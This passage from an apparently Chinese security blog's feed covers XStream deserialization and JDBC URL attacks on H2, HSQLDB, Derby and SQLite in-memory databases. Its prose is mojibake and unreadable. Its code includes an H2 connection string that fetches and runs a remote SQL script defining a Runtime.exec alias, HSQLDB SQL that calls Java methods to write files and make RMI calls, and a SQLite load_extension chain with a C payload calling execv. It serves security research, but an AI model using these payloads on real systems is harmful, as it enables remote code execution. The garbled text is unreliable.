éƒ½æ˜¯åˆ©ç”¨åˆ°äº†TreeSetConveter &amp; DynamicProxyConverterï¼ŒGroovy Expandoåˆ©ç”¨åˆ°äº†MapConverterã€‚</p><p>é—ç•™é—®é¢˜ï¼š</p><ol><li>gadget 4å’Œ5è¿˜éœ€è¦å†å•ç‹¬åˆ†æåˆ†æï¼ŒWh1t3p1gå¸ˆå‚…çš„ysomapè¿˜æœ‰å‡ ä¸ªgadgetï¼Œä¹Ÿéœ€è¦å†å•ç‹¬å­¦ä¹ å­¦ä¹ å§¿åŠ¿ã€‚</li><li>BCEL è¿™ç§é€šç”¨çš„åˆ©ç”¨æ‰‹æ³•æ€è·¯ï¼Œæœ‰æ²¡æœ‰å…¶ä»–çš„APPã€‚</li><li>XStream åç»­çš„å‡ ä¸ªCVE</li><li>XStream çš„é»‘åå•å®‰å…¨æ‰‹æ®µï¼ŒSecurityConveter</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ·±å…¥åˆ†æ</a></li><li>[3] <a href="https://www.jianshu.com/p/387c568faf62">XStream æºç è§£æ</a></li><li>[4] <a href="https://www.anquanke.com/post/id/172198">jenkins 2.101 XStream rce æŒ–æ˜æ€è·¯</a></li><li>[5] <a href="https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-%E7%A9%BA%E6%8C%87%E9%92%88CTF%E4%B8%80%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9BWriteup/">Jenkins 2.101 XStream Rce[ç©ºæŒ‡é’ˆCTFä¸€æœˆå†…éƒ¨èµ›Writeup]</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;XStream ååºåˆ—åŒ–é—®é¢˜ç”±æ¥å·²ä¹…ï¼Œä»&amp;lt;=1.4.6ç‰ˆæœ¬ä¹‹ä¸‹çš„EventHandleråˆ©ç”¨æ–¹å¼ï¼Œåˆ°20å¹´çš„CVE-2020-26217ï¼Œå†åˆ°21å¹´é’Ÿå¸ˆå‚…ã€threedr3amã€whit3p1gå¸ˆå‚…ä»¬ä¸è¦é’±ä¼¼çš„6ä¸ªCVEã€‚å®ƒçš„æˆå› ä¸åŒäºfastjsonä¹‹ç±»ï¼Œä¹Ÿæœ‰å¼‚äºåŸç”ŸJavaååºåˆ—åŒ–ï¼Œå¾ˆæœ‰ç‰¹ç‚¹ï¼Œå€¼å¾—å­¦ä¹ ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬èŠ‚å…¶å®ç®—æ˜¯Wh1t3p1gå¸ˆå‚…ã€Šå›é¡¾XStreamååºåˆ—åŒ–æ¼æ´ã€‹çš„å­¦ä¹ ç¬”è®°ï¼Œä¹Ÿè¯•ç€è§£é‡Šå¸ˆå‚…æ²¡æåˆ°çš„ä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;1-XStream-åŸç†è§£æ&quot;&gt;&lt;a href=&quot;#1-XStream-åŸç†è§£æ&quot; class=&quot;headerlink&quot; title=&quot;1. XStream åŸç†è§£æ&quot;&gt;&lt;/a&gt;1. XStream åŸç†è§£æ&lt;/h2&gt;&lt;h3 id=&quot;1-1-æºç è§£æ&quot;&gt;&lt;a href=&quot;#1-1-æºç è§£æ&quot; class=&quot;headerlink&quot; title=&quot;1.1 æºç è§£æ&quot;&gt;&lt;/a&gt;1.1 æºç è§£æ&lt;/h3&gt;&lt;p&gt;å‚è€ƒã€3ã€‘&lt;br&gt;&lt;img src=&quot;/images/pasted-136.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>Jdbcç¢ç¢å¿µä¸‰ï¼šå†…å­˜æ•°æ®åº“</title>
    <link href="http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2021-04-26T06:10:00.000Z</published>
    <updated>2021-11-25T05:58:45.255Z</updated>
    
    <content type="html"><![CDATA[<p>ç»§ç»­è®¨è®ºè®¨è®ºåœ¨jdbc urlå¯æ§æƒ…å†µä¸‹ï¼Œæœ‰å“ªä¸‹æ”»å‡»æ‰‹æ³•ï¼Ÿ</p><ol><li>æ”»å‡»clientæ€è·¯ï¼Œå…¸å‹çš„å°±æ˜¯mysql clientï¼Œå‰é¢è®²è¿‡</li><li>æ”»å‡»serveræ€è·¯ï¼Œå†…å­˜æ•°æ®åº“å°±æ˜¯å½“å‰serverï¼Œå‘ç°ç›¸å…³ä»‹ç»æ–‡ç« éƒ½æ¯”è¾ƒæ•£ï¼Œè¿™é‡Œå°è¯•æ¢ç´¢æ€»ç»“ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‘ç°æ–°çš„å§¿åŠ¿</li></ol><h1 id="æ”»å‡»å†…å­˜æ•°æ®åº“Server"><a href="#æ”»å‡»å†…å­˜æ•°æ®åº“Server" class="headerlink" title="æ”»å‡»å†…å­˜æ•°æ®åº“Server"></a>æ”»å‡»å†…å­˜æ•°æ®åº“Server</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>h2_exec.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="keyword">String</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;open -a calculator.app&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>python -m SimpleHTTPServer 3333</code></p><p>è§¦å‘ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:3333/h2_exec.sql&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    Connection con = DriverManager.getConnection(url);</span><br><span class="line">&#125;<span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-133.png" alt="upload successful"></p><p>tips: <code>java -cp h2.jar org.h2.tools.Server</code>å¯ä»¥å¼€å¯web console server</p><h2 id="HSQLDB"><a href="#HSQLDB" class="headerlink" title="HSQLDB"></a>HSQLDB</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hsqldb<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hsqldb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨hsqldb HTTP Server</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.server.WebServer --database.0 file:mydb --dbname.0 xdb</span><br><span class="line"><span class="comment"># è¿æ¥</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.util.DatabaseManagerSwing</span><br></pre></td></tr></table></figure><p>æµ…è“å¤§ä½¬å…³äºHSQLDBçš„æ€»ç»“ç®—æ˜¯è§åˆ°æœ€å…¨é¢çš„ç›¸å…³æ–‡ç« äº†ï¼Œè¯¦æƒ…å‚è€ƒã€5ã€‘ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºæ–¹æ³•&amp;ç»“è®º</p><h3 id="1-åˆ©ç”¨call-java-static-function"><a href="#1-åˆ©ç”¨call-java-static-function" class="headerlink" title="1. åˆ©ç”¨call java static function"></a>1. åˆ©ç”¨call java static function</h3><p>åˆ©ç”¨hsqldb create function/procedureå¯ç›´æ¥è°ƒç”¨Javaé™æ€æ–¹æ³•ï¼Œä¾‹å¦‚</p><ul><li>rmi åˆ©ç”¨<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> rce(<span class="built_in">VARCHAR</span>(<span class="number">80</span>))</span><br><span class="line">    <span class="keyword">returns</span> <span class="built_in">VARCHAR</span>(<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">no</span> <span class="keyword">sql</span></span><br><span class="line">    <span class="keyword">language</span> <span class="keyword">java</span></span><br><span class="line">    <span class="keyword">external</span> <span class="keyword">name</span> <span class="string">&#x27;CLASSPATH:java.rmi.Naming.list&#x27;</span></span><br><span class="line">;</span><br><span class="line"><span class="keyword">CALL</span> rce(<span class="string">&#x27;rmi://127.0.0.1:2333/a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li>å†™æ–‡ä»¶<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> writeBytesToFilename(<span class="keyword">IN</span> paramString <span class="built_in">VARCHAR</span>(<span class="number">1024</span>), <span class="keyword">IN</span> paramArrayOfByte VARBINARY(<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">JAVA</span></span><br><span class="line"><span class="keyword">DETERMINISTIC</span> <span class="keyword">NO</span> <span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> <span class="keyword">NAME</span> <span class="string">&#x27;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;</span><br><span class="line"><span class="keyword">call</span> writeBytesToFilename(<span class="string">&#x27;/tmp/hsql111&#x27;</span>, <span class="keyword">cast</span> (<span class="string">&#x27;313131313131&#x27;</span> <span class="keyword">AS</span> VARBINARY(<span class="number">1024</span>)));</span><br></pre></td></tr></table></figure></li></ul><p>ä½†æ˜¯åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦</p><ol><li>å¯æ§jdbc URL</li><li>å¯è‡ªå®šä¹‰æ‰§è¡Œsqlï¼Œå»call javaé™æ€æ–¹æ³•</li></ol><h3 id="2-åˆ©ç”¨ååºåˆ—åŒ–"><a href="#2-åˆ©ç”¨ååºåˆ—åŒ–" class="headerlink" title="2. åˆ©ç”¨ååºåˆ—åŒ–"></a>2. åˆ©ç”¨ååºåˆ—åŒ–</h3><p>èµä¸€ä¸ªæµ…è“å¤§ä½¬çš„æ–‡ç« å‚è€ƒã€5ã€‘ï¼Œhsqlç ”ç©¶æ–‡ç« æŒºå°‘çš„ï¼Œæµ…è“å¤§ä½¬æ€»ç»“å¾ˆåˆ°ä½ã€‚<br>è§¦å‘ç‚¹æœ‰ä¸¤ä¸ª</p><ol><li>JDBCResultSetï¼Œè·å–sqlè¿è¡Œç»“æœçš„æ—¶å€™ï¼ŒgetObjectè§¦å‘</li><li>JDBCCallableStatementï¼Œé¢„ç¼–è¯‘é˜¶æ®µï¼ŒæŒ‡å®šOTHERç±»å‹å‚æ•°æ—¶å¯ä»¥è§¦å‘</li></ol><p>æµ…è“ç”¨åˆ°çš„demoæ˜¯2ï¼Œ1çš„demoå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line">String dburl = <span class="string">&quot;jdbc:hsqldb:http://127.0.0.1/xdb&quot;</span>;</span><br><span class="line">Connection connection = DriverManager.getConnection(dburl, <span class="string">&quot;sa&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">Statement stmt = connection.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;SELECT * FROM \&quot;PUBLIC\&quot;.\&quot;MOVIES\&quot;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¿›ä¸€æ­¥è‡ªåŠ¨åŒ–æˆç±»ä¼¼mysql fake serverï¼Œæ”»å‡»clientï¼Œä¸è¿‡è§¦å‘ä¹Ÿæ˜¯å¾ˆé¸¡è‚‹äº†</p><ol><li>å¯æ§jdbc URL</li><li>éœ€è¦client execteQueryå¹¶ä¸” getObject</li></ol><p>é¡ºå¸¦æåˆ°ä¸‹å‚è€ƒã€7ã€‘ä¸­çš„CVE-2020-5902 F5 big-ipçš„è¿™ä¸ªæ¼æ´ï¼Œè°ƒè¯•æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œè¿˜æœ‰å®½å­—èŠ‚é‡åˆ°çš„è¿™ä¸ªcaseï¼Œå‚è€ƒã€8ã€‘</p><h2 id="Apache-Derby"><a href="#Apache-Derby" class="headerlink" title="Apache Derby"></a>Apache Derby</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.derby<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>derby<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.13.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ldap å’Œcall åº”è¯¥ä¼šæœ‰é—®é¢˜<br>To Be Continuedâ€¦</p><h2 id="SQlite"><a href="#SQlite" class="headerlink" title="SQlite"></a>SQlite</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.16.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2021/11/25æ–°å¢<br>ç»“åˆpyn3rdçš„hitb çš„PPTï¼ŒURLå¯æ§ä¸”SQLå¯æ§æƒ…å†µä¸‹ï¼Œå¯ä»¥å®ç°RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadExtension</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">    Connection connection = DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite::resource:http://127.0.0.1:8888/poc2.db?enable_load_extension=true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connection.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    Statement statement = connection.createStatement();</span><br><span class="line">    statement.execute(<span class="string">&quot;SELECT load_extension(&#x27;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/sqlite-jdbc-tmp-264346288.db&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    statement.close();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -fPIC -shared sq2.c -o sq2.dylib</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sqlite3ext.h&gt; /* Do not use &lt;sqlite3.h&gt;! */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqlite3_extension_init</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  sqlite3 *db, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">char</span> **pzErrMsg, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> sqlite3_api_routines *pApi</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> *argv[]=&#123;<span class="string">&quot;open&quot;</span>,<span class="string">&quot;-a&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> *envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execv(<span class="string">&quot;/usr/bin/open&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚æ¢è®¨äº†ä¸‹åœ¨jdbc urlå¯æ§æƒ…å†µä¸‹ï¼Œå› ä¸ºå†…å­˜æ•°æ®åº“Server&amp;Clientå°±æ˜¯å½“å‰åŒä¸€å°æœºå™¨ï¼Œå¯»æ‰¾å†…å­˜æ•°æ®åº“çš„åˆ©ç”¨ç‚¹ã€‚æ€è·¯æœ‰ä¸¤ç‚¹ï¼š</p><ul><li>åˆ©ç”¨æ•°æ®åº“ç‰¹æ€§ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤/å†™æ–‡ä»¶ï¼Œåœ¨Serverä¸ŠRCE</li><li>åˆ©ç”¨ååºåˆ—åŒ–ï¼Œæ„é€ æ¶æ„Serverï¼Œåœ¨Clientä¸ŠRCE</li></ul><p>ç›®å‰é™¤äº†H2ï¼Œå…¶ä»–è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œæœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://kbase.ayoma.me/databases/">Security Knowledge Base/ Databases</a></li><li>[2] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[3] <a href="https://www.anquanke.com/post/id/210849">F5 BIG-IP hsqldbï¼ˆCVE-2020-5902ï¼‰æ¼æ´è¸©å‘åˆ†æ</a></li><li>[4] <a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902">Proof of Concept for CVE-2020-5902</a></li><li>[5] <a href="https://xz.aliyun.com/t/9162">HSQLDB å®‰å…¨æµ‹è¯•æŒ‡å—ï¼ˆæµ…è“å¤§ä½¬ï¼‰</a></li><li>[6] <a href="http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html">Chapter 14. Properties</a></li><li>[7] <a href="https://cert.360.cn/report/detail?id=55654da3c33b4c832167a8902f14cd4f">CVE-2020-5902: F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</a></li><li>[8] <a href="https://mp.weixin.qq.com/s/yvEHxhsedSwB12PTcQ5aRg">javaæ¶æ„æ ·æœ¬è°ƒè¯•æŒ‡å—</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»§ç»­è®¨è®ºè®¨è®ºåœ¨jdbc urlå¯æ§æƒ…å†µä¸‹ï¼Œæœ‰å“ªä¸‹æ”»å‡»æ‰‹æ³•ï¼Ÿ&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ”»å‡»clientæ€è·¯ï¼Œå…¸å‹çš„å°±æ˜¯mysql clientï¼Œå‰é¢è®²è¿‡&lt;/li&gt;
&lt;li&gt;æ”»å‡»serveræ€è·¯ï¼Œå†…å­˜æ•°æ®åº“å°±æ˜¯å½“å‰serverï¼Œå‘ç°ç›¸å…³ä»‹ç»æ–‡ç« éƒ½æ¯”è¾ƒæ•£ï¼Œè¿™é‡Œå°è¯•æ¢ç´¢æ€»ç»“ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‘ç°æ–°çš„å§¿åŠ¿&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;æ”»å‡»å†…å­˜æ•°æ®åº“Server&quot;&gt;&lt;a href=&quot;#æ”»å‡»å†…å­˜æ•°æ®åº“Server&quot; class=&quot;headerlink&quot; title=&quot;æ”»å‡»å†…å­˜æ•°æ®åº“Server&quot;&gt;&lt;/a&gt;æ”»å‡»å†…å­˜æ•°æ®åº“Server&lt;/h1&gt;&lt;h2 id=&quot;H2&quot;&gt;&lt;a href=&quot;#H2&quot; class=&quot;headerlink&quot; title=&quot;H2&quot;&gt;&lt;/a&gt;H2&lt;/h2&gt;&lt;p&gt;pomä¾èµ–&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.h2database&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;h2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.4.199&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
